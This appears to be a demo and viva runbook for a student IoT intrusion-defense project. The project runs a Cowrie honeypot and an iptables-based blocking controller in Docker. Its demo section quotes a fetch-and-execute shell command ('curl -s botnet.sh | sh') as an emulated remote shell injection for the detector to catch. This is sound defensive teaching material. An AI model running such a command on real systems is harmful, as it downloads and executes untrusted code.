# Autonomous IoT Cyber Defense System — Evaluation & Viva Runbook (v1.1-SOC)

This guide is designed for live project demonstrations, evaluator walkthroughs, and viva examinations. It provides step-by-step presentation commands, architectural justifications, and answers to expected evaluator questions.

---

## 1. Quick Start Commands

### Mode A: Full Containerized Stack (Recommended for Viva Demo)
Boot all 5 services with a single command:
```bash
docker compose up -d
```
* **Mosquitto MQTT Broker:** Port `1883` (IP `172.20.0.10`)
* **Temperature Sensor Node:** Telemetry Publisher (IP `172.20.0.21`)
* **Smart Bulb Node:** Actuator Subscriber (IP `172.20.0.22`)
* **Cowrie Honeypot Decoy:** Medium-Interaction Trap (IP `172.20.0.50`, Ports `2222`, `2223`)
* **Defense Controller & SOC UI:** FastAPI + SSE Dashboard (IP `172.20.0.5`, Port `8050`)

Access the SOC Terminal Dashboard in your browser:
👉 **`http://localhost:8050`**

---

### Mode B: Hybrid Local Development
Run the container mesh in Docker while running the controller directly on your host:
```bash
# 1. Start virtual nodes and honeypot
docker compose up -d mqtt_broker sensor_node bulb_node cowrie_honeypot

# 2. Start the controller locally
python3 controller/main.py
```

---

## 2. Live Demonstration Script (Step-by-Step)

### Step 1: Open the SOC Terminal Dashboard
1. Open **`http://localhost:8050`**.
2. Point out:
   * The pulsing green **`STREAM LIVE`** badge (demonstrates non-buffering unidirectional Server-Sent Events).
   * The version badge: **`v1.1-SOC`**.
   * The **Virtual IoT Network Topology** cards showing 4 online devices in `iot_production_net` (`172.20.0.0/24`).
   * The **Netfilter Drop Inventory** initialized with active drop rules.

### Step 2: Demonstrate Autonomous Attack Mitigation (< 1,000 ms)
You can demonstrate detection and mitigation using **either** the web UI or the terminal:

#### Method A: Direct Browser 1-Click Trigger (Recommended for Presentations)
1. On the dashboard, locate the **Adversary Intrusion Simulation (Red Team Controls)** toolbar.
2. Click **`⚡ Trigger Brute-Force`**:
   * Watch the **Honeypot Console Feed** stream 5 authentication failures in real time.
   * Upon the 5th attempt, watch the system autonomously inject an `IPTABLES_DROP` rule and display the record in the **Autonomous Mitigation Ledger**!
3. Click **`🔥 Trigger Terminal Exploit`**:
   * Emulates a remote shell injection (`curl -s botnet.sh | sh`).
   * Evaluates the command pattern and immediately fires a **`CRITICAL`** kernel drop in sub-millisecond time.
4. Click **`📡 Trigger Port Sweep`**:
   * Emulates a port reconnaissance probe, triggering a subnet sweep mitigation.

#### Method B: Automated CLI Adversary Script
In your terminal, execute the automated red team adversary script:
```bash
python3 tests/attacker_sim.py --all
```
**What happens in real time:**
1. The script rapidly sends reconnaissance sweeps, dictionary credential attempts, and exploit payloads.
2. The `HoneypotLogTailer` captures the events asynchronously from `cowrie.json`.
3. The `IntrusionDetector` evaluates the in-memory rolling window (`collections.deque`).
4. Autonomous Netfilter drops are executed:
   * Rule injected: `iptables -I IOT_DEFENSE_BLOCKLIST 1 -s <IP> -j DROP`
   * Benchmark reaction time: **`~0.65 ms`** (sub-millisecond closed-loop reaction time!).
5. The dashboard automatically updates over SSE:
   * Active bans counter increments.
   * New rows appear in the **Autonomous Mitigation Ledger** with target IP and trigger reason.
   * Real-time attack events stream across the **Honeypot Console Feed**.

### Step 3: Demonstrate Rogue Node Dynamic Quarantine
1. On the dashboard, locate the **Temp Sensor 01** card.
2. Click the red **"Simulate Infection"** button.
3. Observe:
   * The container status immediately transitions to **`QUARANTINED`** (card flashes red).
   * The Docker Python SDK detaches `iot_sensor_node` from `iot_production_net` and attaches it to `iot_quarantine_net` (`internal: true`).
   * Explain: *"The compromised node is completely isolated from the internet and broker, preventing lateral spread while maintaining forensic retention."*
4. Click **"Restore"** to return the sensor back to normal production operation.

### Step 4: Demonstrate Manual Override & Safety Allowlists
1. Click the **"Unban"** button next to any blocked IP in the ledger.
2. The drop rule is idempotently removed from the Linux kernel and the ledger refreshes.
3. Click **"Reset All Bans"** to flush the custom Netfilter chain.

---

## 3. Key Evaluator Questions & Technical Answers

### Q1: Why did you use `DOCKER-USER` and a custom chain rather than the standard `INPUT` table?
> **Answer:** *"Docker bypasses standard host `INPUT` filtering because forwarded container traffic flows through the `FORWARD` chain. Docker provides the official `DOCKER-USER` chain specifically for custom firewall rules. By inserting a custom sub-chain `IOT_DEFENSE_BLOCKLIST` inside `DOCKER-USER`, our controller intercepts traffic before Docker's internal NAT rules without polluting the host's primary firewall."*

### Q2: How does the system achieve sub-second reaction times?
> **Answer:** *"We use an in-memory sliding window frequency evaluator backed by double-ended queues (`collections.deque`). Adding timestamps and pruning expired windows are $O(1)$ operations in RAM. By decoupling detection from asynchronous database logging and using non-blocking file tailing, our measured benchmark reaction time is under 1 millisecond (0.65 ms)."*

### Q3: How do you prevent an attacker from spoofing an administrator's IP to lock them out?
> **Answer:** *"We enforce a strict, non-negotiable `AllowlistManager` using Python's `ipaddress` library. Under no circumstance can a rule be generated targeting loopback (`127.0.0.1`, `::1`), subnet gateways (`172.20.0.1`), or management subnets (including Docker's host gateway `192.168.65.0/24`). Any ban request targeting a protected address is rejected immediately before reaching Netfilter."*

### Q4: Why Server-Sent Events (SSE) instead of WebSockets for the dashboard?
> **Answer:** *"Our telemetry requirement is strictly unidirectional (server pushing telemetry to client). WebSockets introduce bidirectional protocol overhead, stateful socket framing, and complexity with proxies. SSE operates over standard HTTP, includes automatic browser reconnection, and works seamlessly with `Cache-Control: no-cache` and `X-Accel-Buffering: no`."*

### Q5: How is cross-platform portability ensured across macOS, Linux, and Windows?
> **Answer:** *"Native macOS uses PF instead of `iptables`, and Docker Desktop runs inside a lightweight Linux hypervisor VM. By containerizing our defense controller with `NET_ADMIN` capabilities and using the Docker Engine socket (`/var/run/docker.sock`), our firewall and quarantine behavior is 100% identical regardless of whether the host is macOS, Ubuntu Linux, or Windows WSL2."*

---

## 4. Test Suite Execution
To prove system reliability during evaluation, run all 32 automated tests:
```bash
python3 -m unittest discover -s tests
```
* **Mitigation Driver Tests:** 11 tests (allowlists, Netfilter idempotency, Docker SDK mocking)
* **Detection Engine Tests:** 7 tests (sliding window, brute-force threshold, SQLite audit)
* **FastAPI Backend Tests:** 10 tests (SSE stream headers, REST API schema validation, attack simulation triggers)
* **SOC Dashboard Tests:** 2 tests (HTML template serving, XSS-safe JavaScript rendering)
* **End-to-End Benchmark:** 2 tests (closed-loop latency SLA validation < 1,000 ms)
